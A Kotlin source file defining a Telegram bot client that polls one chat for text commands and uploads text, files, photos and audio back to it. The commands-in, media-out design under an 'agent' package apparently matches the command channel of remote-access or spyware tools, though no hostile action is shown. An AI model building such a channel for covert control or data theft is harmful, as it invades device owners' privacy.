package com.example.agent

import com.example.agent.ErrorReporter
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL

class TelegramClient(
    private val botToken: String,
    private val chatId: String
) {
    private val base = "https://api.telegram.org/bot$botToken"
    var lastUpdateId: Long = 0

    fun getNewCommands(): List<String> {
        val raw = httpGet("$base/getUpdates?offset=${lastUpdateId + 1}&timeout=0")
            ?: return emptyList()

        val json = JSONObject(raw)
        if (!json.getBoolean("ok")) return emptyList()

        val updates = json.getJSONArray("result")
        val commands = mutableListOf<String>()

        for (i in 0 until updates.length()) {
            val update = updates.getJSONObject(i)
            lastUpdateId = update.getLong("update_id")

            val msg    = update.optJSONObject("message") ?: continue
            val fromId = msg.getJSONObject("chat").getLong("id").toString()
            val text   = msg.optString("text", "").trim()

            if (fromId != chatId || text.isEmpty()) continue
            commands.add(text)
        }
        return commands
    }

    fun sendText(text: String) {
        val maxLength = 3500
        val chunks = chunkText(text, maxLength)
        chunks.forEach { chunk ->
            val body = JSONObject().apply {
                put("chat_id", chatId)
                put("text", "```\n$chunk\n```")
                put("parse_mode", "Markdown")
            }.toString()
            httpPost("$base/sendMessage", body)
        }
    }

    fun sendFile(file: File, caption: String = "") {
        if (!file.exists()) return
        multipartUpload("$base/sendDocument", file, "document", "application/octet-stream", caption)
    }

    fun sendPhoto(file: File, caption: String = "") {
        if (!file.exists()) return
        multipartUpload("$base/sendPhoto", file, "photo", "image/jpeg", caption)
    }

    fun sendAudio(file: File) {
        if (!file.exists()) return
        multipartUpload("$base/sendAudio", file, "audio", "audio/mpeg", "")
    }

    private fun chunkText(text: String, maxLength: Int): List<String> {
        val result = mutableListOf<String>()
        var startIndex = 0
        while (startIndex < text.length) {
            val endIndex = minOf(startIndex + maxLength, text.length)
            result.add(text.substring(startIndex, endIndex))
            startIndex = endIndex
        }
        return result
    }

    private fun multipartUpload(urlStr: String, file: File, fieldName: String, contentType: String, caption: String) {
        val boundary = "Boundary${System.currentTimeMillis()}"
        var conn: HttpURLConnection? = null
        try {
            conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            }

            DataOutputStream(conn.outputStream).use { out ->
                out.writeBytes("--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$chatId\r\n")
                if (caption.isNotEmpty())
                    out.writeBytes("--$boundary\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n")
                out.writeBytes("--$boundary\r\nContent-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\nContent-Type: $contentType\r\n\r\n")
                file.inputStream().use { it.copyTo(out) }
                out.writeBytes("\r\n--$boundary--\r\n")
            }
            conn.responseCode
        } catch (e: Exception) {
            ErrorReporter.report(e, "TelegramClient")
            // ignore upload failure
        } finally {
            conn?.disconnect()
        }
    }

    private fun httpGet(urlStr: String): String? = try {
        var conn: HttpURLConnection? = null
        try {
            conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.apply {
                connectTimeout = 10_000
                readTimeout = 15_000
            }
            conn.inputStream.bufferedReader().use { it.readText() }
        } finally {
            conn?.disconnect()
        }
    } catch (e: Exception) {
        ErrorReporter.report(e, "TelegramClient")
        null
    }

    private fun httpPost(urlStr: String, body: String) = try {
        var conn: HttpURLConnection? = null
        try {
            conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
            }
            conn.outputStream.writer().use { it.write(body) }
            conn.inputStream.bufferedReader().use { it.readText() }
        } finally {
            conn?.disconnect()
        }
    } catch (e: Exception) {
        ErrorReporter.report(e, "TelegramClient")
        null
    }
}
